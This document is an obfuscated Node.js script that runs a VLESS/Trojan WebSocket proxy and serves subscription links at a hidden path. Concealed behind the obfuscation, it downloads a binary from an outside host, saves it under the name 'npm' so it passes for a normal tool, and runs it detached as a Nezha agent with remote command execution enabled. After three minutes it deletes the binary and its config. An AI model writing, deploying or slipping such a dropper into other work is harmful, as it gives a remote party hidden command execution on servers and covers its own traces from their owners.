const _0xe78408=_0x60d1;(function(_0x34c36d,_0x11b2c2){const _0x30ada4=_0x60d1,_0x14a246=_0x34c36d();while(!![]){try{const _0x30c66a=-parseInt(_0x30ada4(0x1fe))/0x1+parseInt(_0x30ada4(0x1d9))/0x2+-parseInt(_0x30ada4(0x1cc))/0x3+parseInt(_0x30ada4(0x1cd))/0x4+-parseInt(_0x30ada4(0x217))/0x5+-parseInt(_0x30ada4(0x1c0))/0x6*(parseInt(_0x30ada4(0x224))/0x7)+parseInt(_0x30ada4(0x1bd))/0x8;if(_0x30c66a===_0x11b2c2)break;else _0x14a246['push'](_0x14a246['shift']());}catch(_0x170b0b){_0x14a246['push'](_0x14a246['shift']());}}}(_0x9aaf,0x7e315));const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0xe78408(0x1dc)),net=require('net'),path=require(_0xe78408(0x206)),crypto=require(_0xe78408(0x1f4)),{Buffer}=require(_0xe78408(0x235)),{exec,execSync}=require(_0xe78408(0x201)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0xe78408(0x1fc)]['UUID']||_0xe78408(0x218),NEZHA_SERVER=process[_0xe78408(0x1fc)][_0xe78408(0x204)]||'',NEZHA_PORT=process[_0xe78408(0x1fc)]['NEZHA_PORT']||'',NEZHA_KEY=process['env']['NEZHA_KEY']||'',DOMAIN=process[_0xe78408(0x1fc)][_0xe78408(0x1d2)]||_0xe78408(0x1e4),AUTO_ACCESS=process[_0xe78408(0x1fc)][_0xe78408(0x221)]||!![],WSPATH=process[_0xe78408(0x1fc)][_0xe78408(0x203)]||UUID[_0xe78408(0x1e1)](0x0,0x8),SUB_PATH=process[_0xe78408(0x1fc)][_0xe78408(0x1bc)]||_0xe78408(0x1d1),NAME=process[_0xe78408(0x1fc)]['NAME']||_0xe78408(0x22d),PORT=process[_0xe78408(0x1fc)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x19de2e=_0xe78408;try{const _0x2372ec=await axios[_0x19de2e(0x1c4)](_0x19de2e(0x1d6)),_0x4ecf0c=_0x2372ec[_0x19de2e(0x222)];ISP=(_0x4ecf0c['country']+'-'+_0x4ecf0c[_0x19de2e(0x1f8)])[_0x19de2e(0x1c9)](/ /g,'_');}catch(_0x1cd331){ISP=_0x19de2e(0x1c3);}};function _0x9aaf(){const _0x120895=['connect','createWriteStream','pipe','443','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','then','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','once','utf-8','\x20with\x20all\x20DNS\x20servers','2096','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Failed\x20to\x20resolve\x20','application/dns-json','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','crypto','1.1.1.1','send','npm\x20is\x20running','asOrganization','aarch64','npm\x20running\x20error:','reduce','env','decode','177879JifKWS','write','utf8','child_process','Answer','WSPATH','NEZHA_SERVER','setsid\x20nohup\x20./npm\x20-s\x20','path','createServer','npm\x20is\x20already\x20running,\x20skip\x20running...','includes','every','application/json','catch','writeFileSync','connection','https://oooo.serv00.net/add-url','&path=%2F','map','8443','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','readUInt8','false','toString','1102500cPKJDa','0ef7be44-f6d4-97fd-b0f0-12e044c99c30','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','text/plain','npm\x20download\x20successfully','hex','8.8.4.4','stream','length','type','AUTO_ACCESS','data','npm','5170067DHfoMz',':443?security=tls&sni=','substr','log','https://amd64.ssss.nyc.mn/v1','find','end','update','trim','Hug','pop','true','readFile','text/html','Not\x20Found\x0a','vless://',':443?encryption=none&security=tls&sni=','buffer','join','client_secret:\x20','url','SUB_PATH','9824968YZJbcC','https://amd64.ssss.nyc.mn/agent','split','6tSfWUH','message','&fp=chrome&type=ws&host=','Unknown','get','&type=A','/bin/bash','arch','unlink','replace','listen','error','909921rQmzcD','1788316mCXSjt','readUInt16BE','https://arm64.ssss.nyc.mn/v1','post','sub','DOMAIN','arm','2087','writeHead','https://speed.cloudflare.com/meta','config.yaml','concat','563904basHpB','error:\x20','sha224','axios','close','2083','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','index.html','slice','arm64','\x20-p\x20','1234.abc.com'];_0x9aaf=function(){return _0x120895;};return _0x9aaf();}GetISP();const httpServer=http[_0xe78408(0x207)]((_0x26d429,_0x180905)=>{const _0x534458=_0xe78408;if(_0x26d429[_0x534458(0x1bb)]==='/'){const _0x3ea25c=path[_0x534458(0x236)](__dirname,_0x534458(0x1e0));fs[_0x534458(0x230)](_0x3ea25c,_0x534458(0x200),(_0xf88bee,_0x791c68)=>{const _0x2a06e2=_0x534458;if(_0xf88bee){_0x180905[_0x2a06e2(0x1d5)](0xc8,{'Content-Type':_0x2a06e2(0x231)}),_0x180905['end']('Hello\x20world!');return;}_0x180905['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x180905[_0x2a06e2(0x22a)](_0x791c68);});return;}else{if(_0x26d429[_0x534458(0x1bb)]==='/'+SUB_PATH){const _0x59b40f=_0x534458(0x233)+UUID+'@'+DOMAIN+_0x534458(0x234)+DOMAIN+_0x534458(0x1c2)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x23b60e='trojan://'+UUID+'@'+DOMAIN+_0x534458(0x225)+DOMAIN+_0x534458(0x1c2)+DOMAIN+_0x534458(0x210)+WSPATH+'#'+NAME+'-'+ISP,_0x271987=_0x59b40f+'\x0a'+_0x23b60e,_0x2a2435=Buffer['from'](_0x271987)[_0x534458(0x216)]('base64');_0x180905['writeHead'](0xc8,{'Content-Type':_0x534458(0x21a)}),_0x180905['end'](_0x2a2435+'\x0a');}else _0x180905[_0x534458(0x1d5)](0x194,{'Content-Type':'text/plain'}),_0x180905[_0x534458(0x22a)](_0x534458(0x232));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0xe78408(0x21d),_0xe78408(0x1f5)];function resolveHost(_0xa26ba3){return new Promise((_0x35639d,_0x49aa64)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0xa26ba3)){_0x35639d(_0xa26ba3);return;}let _0x354f3d=0x0;function _0x2ec4ed(){const _0x57e88d=_0x60d1;if(_0x354f3d>=DNS_SERVERS[_0x57e88d(0x21f)]){_0x49aa64(new Error(_0x57e88d(0x1f1)+_0xa26ba3+_0x57e88d(0x1ee)));return;}const _0x688b19=DNS_SERVERS[_0x354f3d];_0x354f3d++;const _0x5db056='https://dns.google/resolve?name='+encodeURIComponent(_0xa26ba3)+_0x57e88d(0x1c5);axios[_0x57e88d(0x1c4)](_0x5db056,{'timeout':0x1388,'headers':{'Accept':_0x57e88d(0x1f2)}})[_0x57e88d(0x1ea)](_0x4cdbe5=>{const _0x4778d2=_0x57e88d,_0x220d9e=_0x4cdbe5['data'];if(_0x220d9e['Status']===0x0&&_0x220d9e[_0x4778d2(0x202)]&&_0x220d9e[_0x4778d2(0x202)][_0x4778d2(0x21f)]>0x0){const _0x25c4e4=_0x220d9e[_0x4778d2(0x202)][_0x4778d2(0x229)](_0x15b418=>_0x15b418[_0x4778d2(0x220)]===0x1);if(_0x25c4e4){_0x35639d(_0x25c4e4['data']);return;}}_0x2ec4ed();})[_0x57e88d(0x20c)](_0x506cde=>{_0x2ec4ed();});}_0x2ec4ed();});}function handleVlessConnection(_0x5d052e,_0x4f82a8){const _0x166f7e=_0xe78408,[_0x527a92]=_0x4f82a8,_0x6a16e3=_0x4f82a8['slice'](0x1,0x11);if(!_0x6a16e3[_0x166f7e(0x20a)]((_0x3d1e05,_0x2249fb)=>_0x3d1e05==parseInt(uuid[_0x166f7e(0x226)](_0x2249fb*0x2,0x2),0x10)))return![];let _0x174031=_0x4f82a8[_0x166f7e(0x1e1)](0x11,0x12)[_0x166f7e(0x214)]()+0x13;const _0x392257=_0x4f82a8[_0x166f7e(0x1e1)](_0x174031,_0x174031+=0x2)[_0x166f7e(0x1ce)](0x0),_0xaee767=_0x4f82a8[_0x166f7e(0x1e1)](_0x174031,_0x174031+=0x1)[_0x166f7e(0x214)](),_0x3c297d=_0xaee767==0x1?_0x4f82a8[_0x166f7e(0x1e1)](_0x174031,_0x174031+=0x4)[_0x166f7e(0x236)]('.'):_0xaee767==0x2?new TextDecoder()[_0x166f7e(0x1fd)](_0x4f82a8['slice'](_0x174031+0x1,_0x174031+=0x1+_0x4f82a8[_0x166f7e(0x1e1)](_0x174031,_0x174031+0x1)[_0x166f7e(0x214)]())):_0xaee767==0x3?_0x4f82a8[_0x166f7e(0x1e1)](_0x174031,_0x174031+=0x10)[_0x166f7e(0x1fb)]((_0x48085d,_0x1b0bd9,_0x4eae73,_0x561745)=>_0x4eae73%0x2?_0x48085d['concat'](_0x561745[_0x166f7e(0x1e1)](_0x4eae73-0x1,_0x4eae73+0x1)):_0x48085d,[])[_0x166f7e(0x211)](_0x1d120b=>_0x1d120b[_0x166f7e(0x1ce)](0x0)['toString'](0x10))[_0x166f7e(0x236)](':'):'';_0x5d052e[_0x166f7e(0x1f6)](new Uint8Array([_0x527a92,0x0]));const _0x3ee925=createWebSocketStream(_0x5d052e);return resolveHost(_0x3c297d)[_0x166f7e(0x1ea)](_0x9011b0=>{const _0x2e4e46=_0x166f7e;net[_0x2e4e46(0x1e5)]({'host':_0x9011b0,'port':_0x392257},function(){const _0x45dcb6=_0x2e4e46;this[_0x45dcb6(0x1ff)](_0x4f82a8['slice'](_0x174031)),_0x3ee925['on']('error',()=>{})[_0x45dcb6(0x1e7)](this)['on'](_0x45dcb6(0x1cb),()=>{})[_0x45dcb6(0x1e7)](_0x3ee925);})['on']('error',()=>{});})[_0x166f7e(0x20c)](_0x40d360=>{const _0x58b44d=_0x166f7e;net[_0x58b44d(0x1e5)]({'host':_0x3c297d,'port':_0x392257},function(){const _0x1ab523=_0x58b44d;this[_0x1ab523(0x1ff)](_0x4f82a8[_0x1ab523(0x1e1)](_0x174031)),_0x3ee925['on']('error',()=>{})[_0x1ab523(0x1e7)](this)['on'](_0x1ab523(0x1cb),()=>{})[_0x1ab523(0x1e7)](_0x3ee925);})['on'](_0x58b44d(0x1cb),()=>{});}),!![];}function handleTrojanConnection(_0x462b3f,_0x422d1b){const _0x241ab6=_0xe78408;try{if(_0x422d1b[_0x241ab6(0x21f)]<0x3a)return![];const _0x4b17e9=_0x422d1b[_0x241ab6(0x1e1)](0x0,0x38)[_0x241ab6(0x216)](),_0x1af283=[UUID];let _0x5bee5e=null;for(const _0x4b233c of _0x1af283){const _0x4277bc=crypto['createHash'](_0x241ab6(0x1db))[_0x241ab6(0x22b)](_0x4b233c)['digest'](_0x241ab6(0x21c));if(_0x4277bc===_0x4b17e9){_0x5bee5e=_0x4b233c;break;}}if(!_0x5bee5e)return![];let _0x5c0cf4=0x38;_0x422d1b[_0x5c0cf4]===0xd&&_0x422d1b[_0x5c0cf4+0x1]===0xa&&(_0x5c0cf4+=0x2);const _0xf2cd3c=_0x422d1b[_0x5c0cf4];if(_0xf2cd3c!==0x1)return![];_0x5c0cf4+=0x1;const _0x197f6b=_0x422d1b[_0x5c0cf4];_0x5c0cf4+=0x1;let _0x118683,_0xc53eda;if(_0x197f6b===0x1)_0x118683=_0x422d1b[_0x241ab6(0x1e1)](_0x5c0cf4,_0x5c0cf4+0x4)[_0x241ab6(0x236)]('.'),_0x5c0cf4+=0x4;else{if(_0x197f6b===0x3){const _0x40705c=_0x422d1b[_0x5c0cf4];_0x5c0cf4+=0x1,_0x118683=_0x422d1b[_0x241ab6(0x1e1)](_0x5c0cf4,_0x5c0cf4+_0x40705c)['toString'](),_0x5c0cf4+=_0x40705c;}else{if(_0x197f6b===0x4)_0x118683=_0x422d1b[_0x241ab6(0x1e1)](_0x5c0cf4,_0x5c0cf4+0x10)['reduce']((_0xe27bac,_0x3859af,_0x53a9d4,_0x10336c)=>_0x53a9d4%0x2?_0xe27bac[_0x241ab6(0x1d8)](_0x10336c[_0x241ab6(0x1e1)](_0x53a9d4-0x1,_0x53a9d4+0x1)):_0xe27bac,[])[_0x241ab6(0x211)](_0x1abc19=>_0x1abc19[_0x241ab6(0x1ce)](0x0)['toString'](0x10))[_0x241ab6(0x236)](':'),_0x5c0cf4+=0x10;else return![];}}_0xc53eda=_0x422d1b[_0x241ab6(0x1ce)](_0x5c0cf4),_0x5c0cf4+=0x2;_0x5c0cf4<_0x422d1b[_0x241ab6(0x21f)]&&_0x422d1b[_0x5c0cf4]===0xd&&_0x422d1b[_0x5c0cf4+0x1]===0xa&&(_0x5c0cf4+=0x2);const _0x10ae66=createWebSocketStream(_0x462b3f);return resolveHost(_0x118683)[_0x241ab6(0x1ea)](_0x588334=>{const _0x2e8367=_0x241ab6;net['connect']({'host':_0x588334,'port':_0xc53eda},function(){const _0x2179ea=_0x60d1;_0x5c0cf4<_0x422d1b['length']&&this['write'](_0x422d1b[_0x2179ea(0x1e1)](_0x5c0cf4)),_0x10ae66['on'](_0x2179ea(0x1cb),()=>{})[_0x2179ea(0x1e7)](this)['on'](_0x2179ea(0x1cb),()=>{})[_0x2179ea(0x1e7)](_0x10ae66);})['on'](_0x2e8367(0x1cb),()=>{});})['catch'](_0x5e2932=>{const _0x305775=_0x241ab6;net[_0x305775(0x1e5)]({'host':_0x118683,'port':_0xc53eda},function(){const _0x5b1397=_0x305775;_0x5c0cf4<_0x422d1b[_0x5b1397(0x21f)]&&this[_0x5b1397(0x1ff)](_0x422d1b[_0x5b1397(0x1e1)](_0x5c0cf4)),_0x10ae66['on'](_0x5b1397(0x1cb),()=>{})[_0x5b1397(0x1e7)](this)['on'](_0x5b1397(0x1cb),()=>{})[_0x5b1397(0x1e7)](_0x10ae66);})['on'](_0x305775(0x1cb),()=>{});}),!![];}catch(_0x3670c0){return![];}}wss['on'](_0xe78408(0x20e),(_0x18e232,_0x470a9f)=>{const _0x2ea67a=_0xe78408,_0xfa0328=_0x470a9f[_0x2ea67a(0x1bb)]||'';_0x18e232[_0x2ea67a(0x1ec)](_0x2ea67a(0x1c1),_0x566de6=>{const _0x3cb989=_0x2ea67a;if(_0x566de6[_0x3cb989(0x21f)]>0x11&&_0x566de6[0x0]===0x0){const _0x213aab=_0x566de6[_0x3cb989(0x1e1)](0x1,0x11),_0x7a3c3c=_0x213aab[_0x3cb989(0x20a)]((_0x57afcf,_0x2ac76b)=>_0x57afcf==parseInt(uuid[_0x3cb989(0x226)](_0x2ac76b*0x2,0x2),0x10));if(_0x7a3c3c){!handleVlessConnection(_0x18e232,_0x566de6)&&_0x18e232[_0x3cb989(0x1dd)]();return;}}!handleTrojanConnection(_0x18e232,_0x566de6)&&_0x18e232[_0x3cb989(0x1dd)]();})['on']('error',()=>{});});function _0x60d1(_0x5d33bc,_0x3f0d26){_0x5d33bc=_0x5d33bc-0x1ba;const _0x9aaf9c=_0x9aaf();let _0x60d17=_0x9aaf9c[_0x5d33bc];return _0x60d17;}const getDownloadUrl=()=>{const _0x2da81b=_0xe78408,_0x2ad6bf=os[_0x2da81b(0x1c7)]();return _0x2ad6bf===_0x2da81b(0x1d3)||_0x2ad6bf===_0x2da81b(0x1e2)||_0x2ad6bf===_0x2da81b(0x1f9)?!NEZHA_PORT?_0x2da81b(0x1cf):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?_0x2da81b(0x228):_0x2da81b(0x1be);},downloadFile=async()=>{const _0x164c73=_0xe78408;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x1327af=getDownloadUrl(),_0x2eaa0a=await axios({'method':_0x164c73(0x1c4),'url':_0x1327af,'responseType':_0x164c73(0x21e)}),_0x18cd2c=fs[_0x164c73(0x1e6)](_0x164c73(0x223));return _0x2eaa0a[_0x164c73(0x222)]['pipe'](_0x18cd2c),new Promise((_0x4505d1,_0x4c33b9)=>{const _0x4aca00=_0x164c73;_0x18cd2c['on']('finish',()=>{const _0xeb46e3=_0x60d1;console['log'](_0xeb46e3(0x21b)),exec('chmod\x20+x\x20npm',_0x5cc46c=>{if(_0x5cc46c)_0x4c33b9(_0x5cc46c);_0x4505d1();});}),_0x18cd2c['on'](_0x4aca00(0x1cb),_0x4c33b9);});}catch(_0xab1c10){throw _0xab1c10;}},runnz=async()=>{const _0x18e992=_0xe78408;try{const _0x4c66f5=execSync(_0x18e992(0x1e9),{'encoding':_0x18e992(0x1ed)});if(_0x4c66f5[_0x18e992(0x22c)]()!==''){console[_0x18e992(0x227)](_0x18e992(0x208));return;}}catch(_0xea0a73){}await downloadFile();let _0x463979='',_0x47e7c9=[_0x18e992(0x1e8),_0x18e992(0x212),_0x18e992(0x1ef),_0x18e992(0x1d4),_0x18e992(0x1de),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x2918a1=_0x47e7c9[_0x18e992(0x209)](NEZHA_PORT)?'--tls':'';_0x463979=_0x18e992(0x205)+NEZHA_SERVER+':'+NEZHA_PORT+_0x18e992(0x1e3)+NEZHA_KEY+'\x20'+_0x2918a1+_0x18e992(0x1f0);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x25161c=NEZHA_SERVER[_0x18e992(0x209)](':')?NEZHA_SERVER[_0x18e992(0x1bf)](':')[_0x18e992(0x22e)]():'',_0x45bcdc=_0x47e7c9['includes'](_0x25161c)?_0x18e992(0x22f):_0x18e992(0x215),_0x4ca1a7=_0x18e992(0x1ba)+NEZHA_KEY+_0x18e992(0x213)+NEZHA_SERVER+_0x18e992(0x1df)+_0x45bcdc+_0x18e992(0x219)+UUID;fs[_0x18e992(0x20d)](_0x18e992(0x1d7),_0x4ca1a7);}_0x463979=_0x18e992(0x1eb);}else{console[_0x18e992(0x227)](_0x18e992(0x1f3));return;}}try{exec(_0x463979,{'shell':_0x18e992(0x1c6)},_0x15a3e1=>{const _0x5e9157=_0x18e992;if(_0x15a3e1)console[_0x5e9157(0x1cb)](_0x5e9157(0x1fa),_0x15a3e1);else console['log'](_0x5e9157(0x1f7));});}catch(_0x45d581){console['error'](_0x18e992(0x1da)+_0x45d581);}};async function addAccessTask(){const _0x3f4074=_0xe78408;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x6b7215='https://'+DOMAIN;try{const _0x10b68c=await axios[_0x3f4074(0x1d0)](_0x3f4074(0x20f),{'url':_0x6b7215},{'headers':{'Content-Type':_0x3f4074(0x20b)}});console[_0x3f4074(0x227)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x3c2239){}}const delFiles=()=>{const _0xdef517=_0xe78408;fs['unlink'](_0xdef517(0x223),()=>{}),fs[_0xdef517(0x1c8)](_0xdef517(0x1d7),()=>{});};httpServer[_0xe78408(0x1ca)](PORT,()=>{const _0x626664=_0xe78408;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x626664(0x227)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
